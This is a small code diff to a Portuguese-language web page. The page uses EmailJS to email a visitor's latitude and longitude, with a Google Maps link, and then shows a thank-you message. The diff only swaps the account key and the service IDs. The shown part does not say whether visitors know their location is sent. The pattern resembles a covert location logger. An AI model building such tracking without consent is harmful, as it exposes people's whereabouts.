@@ -11,7 +11,7 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function(){
-      emailjs.init("JhupoMugVJep2G1lC"); // ⬅️ Coloque aqui seu Public Key do EmailJS
+      emailjs.init("90mR73F6qLxhPODK9"); // ⬅️ Coloque aqui seu Public Key do EmailJS
     })();
 
     function enviarEmail(lat, lon) {
@@ -21,7 +21,7 @@
         link_google_maps: `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`
       };
 
-      emailjs.send("service_jcgmsga", "template_6v7nxkc", templateParams)
+      emailjs.send("service_kc6xk8y", "template_jt9au2d", templateParams)
         .then(function(response) {
           document.body.innerHTML = "<h2>✅ Obrigado!</h2>";
         }, function(error) {
